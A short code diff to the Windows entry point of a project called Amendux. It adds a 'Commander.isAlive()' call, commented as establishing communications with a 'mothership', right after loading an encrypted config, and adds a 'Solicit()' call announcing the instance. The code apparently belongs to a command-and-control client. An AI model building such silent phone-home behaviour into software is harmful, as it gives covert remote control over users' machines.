@@ -34,6 +34,9 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
 	Amendux::Log::Init();
 	Amendux::Config::Init(FileCrypt);
 
+	// Establish communications with mothership
+	Commander.isAlive();
+
     // Initialize global strings
     LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
     LoadStringW(hInstance, IDC_WIN32PROJECT1, szWindowClass, MAX_LOADSTRING);
@@ -47,8 +50,8 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
 	// Window accelerators
     HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WIN32PROJECT1));
 
-	// Establish communications with mothership
-	Commander.isAlive();
+	// Notify mothership of our instance
+	Commander.Solicit();
 
 	// Main message loop
     MSG msg;
